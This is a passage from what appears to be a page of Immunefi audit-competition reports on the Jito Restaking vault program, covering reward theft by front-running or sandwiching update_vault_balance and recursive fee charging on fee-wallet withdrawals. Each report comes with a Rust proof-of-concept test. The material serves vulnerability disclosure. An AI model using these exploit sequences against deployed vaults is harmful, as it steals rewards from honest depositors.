1_000_000; let exploiter = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &exploiter.pubkey(), exploiter_deposit_amount) .await .unwrap(); let exploiter_st_wallet = &get_associated_token_address(&exploiter.pubkey(), &vault.supported_mint);   //create honest depositor let honest_deposit_amount = 10_000; let depositor = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &depositor.pubkey(), honest_deposit_amount) .await .unwrap();   //Warp two epocs let epoch_length = config.epoch_length(); fixture.warp_slot_incremental(epoch_length*2).await.unwrap(); vault_program_client.do_full_vault_update(&vault_root.vault_pubkey,&operator_pubkeys).await.unwrap();     //deposit 10_000 for honest depositor let res = vault_program_client .do_mint_to(&vault_root, &depositor, honest_deposit_amount, 0) .await; match res { Ok(()) => {}, Err(e) => {eprintln!("Error: {:?}", e); return;} }   //delegate honest depositor funds let res = vault_program_client.do_add_delegation(&vault_root, &operator_pubkeys.get(0).unwrap(), honest_deposit_amount).await; match res { Ok(()) => {}, Err(e) => {eprintln!("Error Delegating honest depositor funds: {:?}", e); return;} }   //warp 100 epocs fixture.warp_slot_incremental(epoch_length*100).await.unwrap();  //push 1000 ST reward to the vault let res = vault_program_client.mint_spl_to(&vault.supported_mint, &vault_root.vault_pubkey, 1000) .await; match res { Ok(()) => {}, Err(e) => {eprintln!("Error: {:?}", e); return;} }   //Exploiter move: update vault tracker (without update_balance), deposit, update balance and enqueue withdraw let res = vault_program_client.do_full_vault_update_no_balance(&vault_root.vault_pubkey,&operator_pubkeys).await; let res = vault_program_client.do_mint_to(&vault_root, &exploiter, exploiter_deposit_amount, 0).await; let res = vault_program_client.update_vault_balance(&vault_root.vault_pubkey).await; let exploiter_vrt_wallet = &get_associated_token_address(&exploiter.pubkey(), &vault.vrt_mint); let exploiter_vrt_wallet_account = fixture.get_token_account(&exploiter_vrt_wallet).await.unwrap(); let exploiter_withdrawal_ticket_info = vault_program_client .do_enqueue_withdrawal(&vault_root, &exploiter, exploiter_vrt_wallet_account.amount).await.unwrap();     //an attempt to delegate half of the exploiter's deposited funds fails because they had already enqueued a withdrawal let res = vault_program_client.do_add_delegation(&vault_root, &operator_pubkeys.get(0).unwrap(), exploiter_deposit_amount/2).await; match res { Ok(()) => {}, Err(e) => {eprintln!("Error Delegating Exploiter Funds: {:?}", e);} } //Outputs "Program log: Insufficient funds in vault for delegation" Error   //warp two epocs fixture.warp_slot_incremental(epoch_length*2).await.unwrap(); vault_program_client.do_full_vault_update(&vault_root.vault_pubkey,&operator_pubkeys).await.unwrap();   //exploiter finalizes withdrawal let exploiter_st_bal_before = fixture.get_token_account(&exploiter_st_wallet).await.unwrap().amount; let res = vault_program_client.do_burn_withdrawal_ticket( &vault_root, &exploiter, &exploiter_withdrawal_ticket_info.base, &config.program_fee_wallet).await; let exploiter_st_bal_after = fixture.get_token_account(&exploiter_st_wallet).await.unwrap().amount; let exploiter_withdrawn_st = exploiter_st_bal_after.saturating_sub(exploiter_st_bal_before); println!("Exploiter deposited st: {exploiter_deposit_amount}, widhdrawn st: {exploiter_withdrawn_st}, ST gains: {} ",exploiter_withdrawn_st.saturating_sub(exploiter_deposit_amount)  ); //Output: Exploiter deposited st: 1000000, widhdrawn st: 1000990, ST gains: 990 //Exploiter managed to gain 99% of the 1000 ST reward that was received for the staking of honest depositor funds within up to 2 epocs } } 
```

1.  Run `RUST_LOG=off RUST_BACKTRACE=1 cargo nextest run --nocapture sandwitch_update_balance`
    

[Previous#37079 \[SC-Insight\] Withdrawals can be DOSed by reviving tickets in the same burn tx](/jito-restaking/37079-sc-insight-withdrawals-can-be-dosed-by-reviving-tickets-in-the-same-burn-tx)[Next#37295 \[SC-High\] Rewards can be stolen by depositing immediately after reward tokens get sent to vau](/jito-restaking/37295-sc-high-rewards-can-be-stolen-by-depositing-immediately-after-reward-tokens-get-sent-to-vault)

1.  [Jito Restaking](/jito-restaking)

#37295 \[SC-High\] Rewards can be stolen by depositing immediately after reward tokens get sent to vau
======================================================================================================

**Submitted on Dec 1st 2024 at 23:15:36 UTC by @Emmanuel001 for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

*   **Report ID:** #37295
    
*   **Report Type:** Smart Contract
    
*   **Report severity:** High
    
*   **Target:** https://github.com/jito-foundation/restaking/tree/master/vault\_program
    
*   **Impacts:**
    
    *   Theft of unclaimed yield
        
    

Description


---------------

Brief/Intro


---------------

The update\_vault\_balance function is designed to reward VRT holders by redistributing staking rewards. However, it has a vulnerability: deposits made after reward tokens are sent to the vault but before update\_vault\_balance is called become eligible for those rewards. This allows attackers to monitor for rewards sent to the vault, deposit tokens immediately, and unfairly gain extra rewards at the expense of existing VRT holders

Vulnerability Details


-------------------------

In order to reward vrt holders, protocol exposes a `update_vault_balance` function, which does the following:

*   gets the current st token balance of the vault(new\_st\_balance)(https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/update\_vault\_balance.rs#L44)
    
*   st\_rewards received is gotten by subtracting the vault.tokens\_deposited(token balance accounted for by the vault) from the new\_st\_balance.(https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/update\_vault\_balance.rs#L47)
    
*   necessary fees, if any, gets deducted from the st\_rewards
    
*   tokens\_deposited gets updated to the new\_st\_balance, which means that each vrt is worth more(https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/update\_vault\_balance.rs#L60)
    

So we can see that to reward vrt holders, rewarder first sends st\_tokens to the vault, then calls `update_vault_balance`. The issue is, any deposits made in between the rewarder sending st tokens, and calling `update_vault_balance`, will make the deposit elligible for the rewards. So an attacker can monitor blockchain for any st\_tokens sent to the vault, and then deposit immediately after, which would immediately make his deposited tokens to be worth more(at the expense of other vrt holders) when `update_vault_balance` gets called. This is a theft of rewards.

Consider the following scenario(summary of what happened in PoC):

*   Alice deposits 1000 st tokens, gets minted 1000 vrt
    
*   Fast forward an epoch, rewarder sends 1000 st tokens to vault
    
*   Bob sees this, and immediately deposits 1000 st tokens, and gets minted 1000 vrt tokens
    
*   Bob calls `update_vault_balance`
    
*   Now, both Alice and Bob's vrt tokens are worth 1500 st each
    

Impact Details


------------------

The vulnerability allows attackers to steal rewards meant for existing VRT holders by depositing tokens just before the update\_vault\_balance function is called, diluting the rewards for honest participants. This leads to economic loss for legitimate users.

References


--------------

https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/update\_vault\_balance.rs#L44 https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/update\_vault\_balance.rs#L47 https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/update\_vault\_balance.rs#L60

Proof of Concept


--------------------

Proof of Concept


--------------------

*   Within integration\_tests/tests/vault folder, create a file named "whitehat.rs"
    
*   Be sure to include the whitehat.rs test file in integration\_tests/tests/vault/mod.rs
    
*   Paste the following into the whitehat.rs file:
    

```
#[cfg(test)] mod tests {  use jito_vault_core::{ config::Config, delegation_state::DelegationState, vault_update_state_tracker::VaultUpdateStateTracker, vault_operator_delegation::VaultOperatorDelegation, }; use spl_associated_token_account::get_associated_token_address; use jito_vault_sdk::error::VaultError; use solana_sdk::{ msg, signature::{ Keypair, Signer }, pubkey::Pubkey };   use crate::fixtures::{ fixture::{ ConfiguredVault, TestBuilder }, vault_client::{ assert_vault_error, VaultStakerWithdrawalTicketRoot }, }; use jito_vault_core::vault::BurnSummary; use jito_vault_sdk::instruction::VaultAdminRole;   #[tokio::test] async fn test_steal_rewards_by_depositing_before_update_vault_balance() { //setup let num_operators = 1; let slasher_amounts = vec![]; let deposit_fee_bps = 0; let withdrawal_fee_bps = 0; let reward_fee_bps = 0; let reward_amount = 1000; let MINT_AMOUNT = 1000;   let mut fixture = TestBuilder::new().await; let ConfiguredVault { mut vault_program_client, restaking_program_client: _, vault_config_admin: _, vault_root, restaking_config_admin: _, operator_roots, } = fixture .setup_vault_with_ncn_and_operators( deposit_fee_bps, withdrawal_fee_bps, reward_fee_bps, num_operators, &slasher_amounts ).await .unwrap();   let rewarder = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &rewarder.pubkey(), reward_amount).await .unwrap();   let alice = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &alice.pubkey(), MINT_AMOUNT).await .unwrap();   let bob = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &bob.pubkey(), MINT_AMOUNT).await .unwrap();   //Alice deposits tokens vault_program_client .do_mint_to(&vault_root, &alice, MINT_AMOUNT, MINT_AMOUNT).await .unwrap(); //fast forward an epoch   let config = vault_program_client .get_config(&Config::find_program_address(&jito_vault_program::id()).0).await .unwrap(); fixture.warp_slot_incremental(config.epoch_length()).await.unwrap();   let slot = fixture.get_current_slot().await.unwrap(); let vault_update_state_tracker = VaultUpdateStateTracker::find_program_address( &jito_vault_program::id(), &vault_root.vault_pubkey, slot / config.epoch_length() ).0; vault_program_client .initialize_vault_update_state_tracker( &vault_root.vault_pubkey, &vault_update_state_tracker ).await .unwrap();   for operator in operator_roots { vault_program_client .crank_vault_update_state_tracker( &vault_root.vault_pubkey, &operator.operator_pubkey, &VaultOperatorDelegation::find_program_address( &jito_vault_program::id(), &vault_root.vault_pubkey, &operator.operator_pubkey ).0, &vault_update_state_tracker ).await .unwrap(); }   vault_program_client .close_vault_update_state_tracker( &vault_root.vault_pubkey, &vault_update_state_tracker, slot / config.epoch_length() ).await .unwrap();   //after sometime, rewarder sends rewards to vault and update_vault_balance, but gets frontrun with a deposit call by Bob to steal part of the rewards meant for Alice the depositor vault_program_client .create_and_fund_reward_vault(&vault_root.vault_pubkey, &rewarder, reward_amount).await .unwrap();   //bob frontruns with a deposit vault_program_client.do_mint_to(&vault_root, &bob, MINT_AMOUNT, MINT_AMOUNT).await.unwrap();   //update_vault_balance vault_program_client.update_vault_balance(&vault_root.vault_pubkey).await.unwrap();   //Now check the burn summary let mut vault_details = vault_program_client .get_vault(&vault_root.vault_pubkey).await .unwrap();   let alice_vrt_account = fixture .get_token_account( &get_associated_token_address(&alice.pubkey(), &vault_details.vrt_mint) ).await .unwrap(); let bob_vrt_account = fixture .get_token_account( &get_associated_token_address(&bob.pubkey(), &vault_details.vrt_mint) ).await .unwrap();   let BurnSummary { vault_fee_amount: _, program_fee_amount: _, burn_amount: _, out_amount: alice_out_amount, } = vault_details.burn_with_fee(alice_vrt_account.amount).unwrap();   let BurnSummary { vault_fee_amount: _, program_fee_amount: _, burn_amount: _, out_amount: bob_out_amount, } = vault_details.burn_with_fee(bob_vrt_account.amount).unwrap();   assert_eq!(alice_out_amount, bob_out_amount); assert_eq!(bob_out_amount, MINT_AMOUNT + reward_amount / 2); } }
```

*   Run the PoC test
    

[Previous#37311 \[SC-High\] Attackers can steal rewards by depositing, updating vault balance and withdrawing i](/jito-restaking/37311-sc-high-attackers-can-steal-rewards-by-depositing-updating-vault-balance-and-withdrawing-immed)[Next#37314 \[SC-High\] Vault creators can not withdraw their fees without being recursively charged (vault](/jito-restaking/37314-sc-high-vault-creators-can-not-withdraw-their-fees-without-being-recursively-charged-vault-and)

1.  [Jito Restaking](/jito-restaking)

#37314 \[SC-High\] Vault creators can not withdraw their fees without being recursively charged (vault
======================================================================================================

**Submitted on Dec 2nd 2024 at 05:56:27 UTC by @niroh for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

*   **Report ID:** #37314
    
*   **Report Type:** Smart Contract
    
*   **Report severity:** High
    
*   **Target:** https://github.com/jito-foundation/restaking/tree/master/vault\_program
    
*   **Impacts:**
    
    *   Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
        
    

Description


---------------

Brief/Intro


---------------

The following fees are collected in the Jito Restaking system: Vault fees - include withdraw fee, deposit fee and reward fee, set as bps by vault\_fee\_admin and collected as vrt\_tokens during withdrawal/deposit/vault\_update\_balance. Program fee - set as bps by the config\_admin and collected during withdrawals. all fee bps changes can only take effect at the start of the next process\_initialize\_vault\_update\_state\_tracker. vault fees are sent to the vault\_fee\_wallet, and program fees to the program\_fee\_wallet, all in the form of vrt\_tokens.

Vulnerability Details


-------------------------

The problem is that when a vault creator/admin wishes to withdraw their fees from the fee\_wallet, they are subject to the same fee collection rules of any other withdrawal, including a "recursive" charge of withdrawal\_fee\_bps from the wallet to itself. This causes both a loss through paying excessive program fees, and a DOS on full fee withdrawal, as the following fee withdrawal flow demonstrates:

1.  Assume vault\_withdrawal\_fee and program\_fee are 10% each
    
2.  A user withdraws 100\_000 vrts
    
3.  10\_000 vrts are sent to the vault\_fee\_wallet and 10\_000 vrts are sent to the program\_fee\_wallet, and the user receives the ST value of 80\_000 vrts
    
4.  Next the owner of vault\_fee\_wallet wants to withdraw the 10\_000 vrts it received, and so it enqueues a withdrawal ticket for its 10\_000 vrts.
    
5.  Two epocs later, when the withdrawal ticket matures and burned, the burn\_withdrawal\_ticket instruction will "send back" to the vault\_fee\_wallet 1000 vrts, send 1000 vrts to the program\_fee\_wallet and send the ST value of 8000 vrts to the vault\_fee\_wallet.
    
6.  The owner of vault\_fee\_wallet will now have to enqueue a new withdrawal ticket for the "sent back" fee of 1000 VRTs, which will again, only enable withdrawing 80% of the amount, charging the rest as vault/program fees. For a full withdrawal the vault\_fee\_wallet will have to recursively enqueue withdrawals multiple times until the amount left is so small it will be fully withdrawn. (see POC for detailed example).
    

### 

Notes

1.  While the vault creator controls the withdrawal\_fee\_bps, they can not resolve this by setting the withdrawal\_fee\_bps to zero before they burn the withdrawal ticket and back up after the burn. The reason is that fee changes only take effect on the next process\_initialize\_vault\_update\_state\_tracker. If the vault owner changes the fee to zero before the update cycle of the epoc in which they burn their withdrawal ticket, this change will remain in effect atleast until the next epoc, causing an unpredictable loss from forgone withdrawal fees during that epoc.
    
2.  The same problem exists for the program fee. When the program\_fee\_wallet owner tries to withdraw the fee, program\_fee\_wallet will recursively "charge to itself" the program fee in addition to paying the vault withdrawal\_fee. Similarly to the vault\_fee\_wallet, full withdrawal will be DOSed for a prologed time due to the multiple calls required, and will cause the program to over-pay vault withdrawal fees.
    

Recomendation


-----------------

1.  Make withdrawals signed by the vault\_fee\_wallet/program\_fee\_wallet exempt from fees. They can be either entirely exempt (from both vault and program fees), or each exempt only from recursively paying themselves fees. (depending on the protocol's desired behavior)
    

Impact Details


------------------

This bug results in two main impacts:

1.  loss of funds for the owner of vault\_fee\_wallet, through overpaying program fees (see POC example where 25% higher program fees are paid). While technically not "theft", the impact from the vault owner perspective is the same, as their funds end up in someone else's hands.
    
2.  A secondary impact is DOS (and additional transaction costs) of full fee withdrawal. This is due to the need to perform multiple withdraws that require each a couple of epocs to complete. In the POC example, a full withdrawal of fees will take atleast 42 epocs or 84 days. Considering that during this period new fees are expected to accrue, this practically means the vault owner is never able to fully withdraw fees.
    

References


--------------

https://github.com/jito-foundation/restaking/blob/406903e569da657035a2ca71ad16f8a930db6940/vault\_program/src/burn\_withdrawal\_ticket.rs#L94 https://github.com/jito-foundation/restaking/blob/406903e569da657035a2ca71ad16f8a930db6940/vault\_core/src/vault.rs#L1008

Proof of Concept


--------------------

Proof of Concept


--------------------

### 

How to run

1.  In integration\_tests/tests/fixtures/vault\_client.rs line 236, change the program\_fee\_bps parameter from 0 to 1000 (quick workaround to set a 10% program fee)
    
2.  Copy the code below to a new test file under integration\_tests/tests/vault/
    
3.  Run `RUST_LOG=off RUST_BACKTRACE=1 cargo nextest run --nocapture test_vault_fee_withdrawal`
    

```
#[cfg(test)] mod tests {  //use jito_vault_sdk::error::VaultError; use solana_sdk::signature::{Keypair, Signer}; use jito_vault_core::{config::Config}; use crate::fixtures::fixture::{ConfiguredVault, TestBuilder}; use spl_associated_token_account::get_associated_token_address;  #[tokio::test] async fn test_vault_fee_withdrawal() { let mut fixture = TestBuilder::new().await;   let deposit_fee_bps = 0; let withdrawal_fee_bps = 2000; let reward_fee_bps = 0; let num_operators = 2; let slasher_amounts = vec![];   let (ConfiguredVault { mut vault_program_client, mut restaking_program_client, vault_root, operator_roots, .. }) = fixture .setup_vault_with_ncn_and_operators( deposit_fee_bps, withdrawal_fee_bps, reward_fee_bps, num_operators, &slasher_amounts,  ) .await .unwrap();  //get config data let mut config = vault_program_client .get_config(&Config::find_program_address(&jito_vault_program::id()).0) .await .unwrap();    //get vault let mut vault = vault_program_client.get_vault(&vault_root.vault_pubkey).await.unwrap(); let vault_vrt_fee_wallet = &get_associated_token_address(&vault.fee_wallet, &vault.vrt_mint); //create a supported mint account to the vault admin since they are also the fee wallet and need to be able to receive STs vault_program_client.create_ata(&vault.supported_mint, &vault_root.vault_admin.pubkey()).await.unwrap();     //get program fee wallet account address let program_vrt_fee_wallet_address = &get_associated_token_address(&config.program_fee_wallet, &vault.vrt_mint);   //get operator keys let operator_pubkeys: Vec<_> = operator_roots .iter() .map(|root| root.operator_pubkey) .collect();  //Warp two epocs let epoch_length = config.epoch_length(); fixture.warp_slot_incremental(epoch_length*2).await.unwrap();  //create depositor let initial_deposit = 100_000 * 10_u64.pow(9); //assuming 9 decimals let depositor = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &depositor.pubkey(), initial_deposit) .await .unwrap();   //full vault update vault_program_client.do_full_vault_update(&vault_root.vault_pubkey,&operator_pubkeys).await.unwrap();   //make a deposit of 100_000 for depositor let result = vault_program_client .do_mint_to(&vault_root, &depositor, initial_deposit, 0) .await;   //withdraw depositor let depositor_vrt_wallet = &get_associated_token_address(&depositor.pubkey(), &vault.vrt_mint); let depositor_vrt_wallet_account = fixture.get_token_account(&depositor_vrt_wallet).await.unwrap(); println!("Depositor vrt balance: {}",depositor_vrt_wallet_account.amount); let ticket_info = vault_program_client .do_enqueue_withdrawal(&vault_root, &depositor, depositor_vrt_wallet_account.amount).await.unwrap();   //Warp two epocs fixture.warp_slot_incremental(epoch_length*2).await.unwrap(); vault_program_client.do_full_vault_update(&vault_root.vault_pubkey,&operator_pubkeys).await.unwrap();     //burn depositor withdrawal ticket //test emptying the depositor lamports to see that the account will be closed let _ = vault_program_client.do_burn_withdrawal_ticket( &vault_root, &depositor, &ticket_info.base, &config.program_fee_wallet).await;   //check vault_fee_wallet vrt_token balance let vault_vrt_fee_account = fixture.get_token_account(&vault_vrt_fee_wallet).await.unwrap(); println!("Vault fee wallet vrt balance before withdraw loop: {}",vault_vrt_fee_account.amount);       //loop-withdraw the vrt_tokens in the vault_vrt_fee_wallet until the entire starting fee is withdrawn let mut epocs=0; let staring_vrt = vault_vrt_fee_account.amount; let mut left_vert =staring_vrt; let mut program_total_fee_vrt = 0; while left_vert > 0 { //create vault fee withdrawal ticket let v_ticket_info = vault_program_client .do_enqueue_withdrawal(&vault_root, &vault_root.vault_admin, left_vert).await.unwrap();     //Warp two epocs fixture.warp_slot_incremental(epoch_length*2).await.unwrap(); vault_program_client.do_full_vault_update(&vault_root.vault_pubkey,&operator_pubkeys).await.unwrap(); epocs+=2;   let program_fee_bal_before = fixture.get_token_account(&program_vrt_fee_wallet_address).await.unwrap().amount;   //burn vault fee withdrawal ticket let result = vault_program_client.do_burn_withdrawal_ticket( &vault_root, &vault_root.vault_admin, &v_ticket_info.base, &config.program_fee_wallet).await; match result { Err(e) => {eprintln!(" Error: {:?}", e); }// Log or handle the error}, Ok(()) => {} } let program_fee_bal_after = fixture.get_token_account(&program_vrt_fee_wallet_address).await.unwrap().amount; let curr_program_fee_diff = program_fee_bal_after - program_fee_bal_before; //check fee wallet left VRT // let vault_vrt_fee_wallet = &get_associated_token_address(&vault.fee_wallet, &vault.vrt_mint); let vault_vrt_fee_account = fixture.get_token_account(&vault_vrt_fee_wallet).await.unwrap(); println!("Epoc {epocs} Vault fee wallet vrt balance leftover after burn: {}",vault_vrt_fee_account.amount); println!("Epoc {epocs}  program fee gained: {}\n",curr_program_fee_diff);   left_vert = vault_vrt_fee_account.amount; program_total_fee_vrt+=curr_program_fee_diff; } let effective_bps = program_total_fee_vrt  * 10000 / staring_vrt; println!("Full withdrawal of {staring_vrt} VRTs took {epocs} epocs. total program fee  was {program_total_fee_vrt}\n program fee bps: {} effective program fee bps: {effective_bps}",config.program_fee_bps()); //Output - Full withdrawal of 20000000000000 VRTs took 42 epocs. total program fee  was 2500000000005 //program fee bps: 1000 effective program fee bps: 1250 //The vault pays 25% more fee than defined and takes 42 epocs to fully withdraw   }     } 
```

[Previous#37295 \[SC-High\] Rewards can be stolen by depositing immediately after reward tokens get sent to vau](/jito-restaking/37295-sc-high-rewards-can-be-stolen-by-depositing-immediately-after-reward-tokens-get-sent-to-vault)[NextSwayLend frontend](/swaylend-frontend)

